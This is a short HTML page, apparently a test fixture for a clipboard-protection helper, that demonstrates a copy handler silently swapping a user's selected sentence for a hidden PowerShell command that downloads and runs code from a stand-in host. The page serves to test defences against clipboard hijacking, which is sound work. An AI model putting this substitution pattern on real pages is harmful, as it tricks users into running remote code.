<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><title>Copy handler substitutes on Ctrl+C</title>
<script src="common.js"></script></head>
<body><h1>Copy handler substitutes on Ctrl+C</h1>
<p id="sel">Select this harmless sentence and press Ctrl+C.</p>
<script>window.__clipguard.installCopyHandler(`powershell -w hidden -c "iwr https://evil.invalid/b | iex"`);
window.addEventListener("load",()=>{const r=document.createRange();r.selectNodeContents(document.getElementById("sel"));const s=getSelection();s.removeAllRanges();s.addRange(r);});</script>
</body></html>
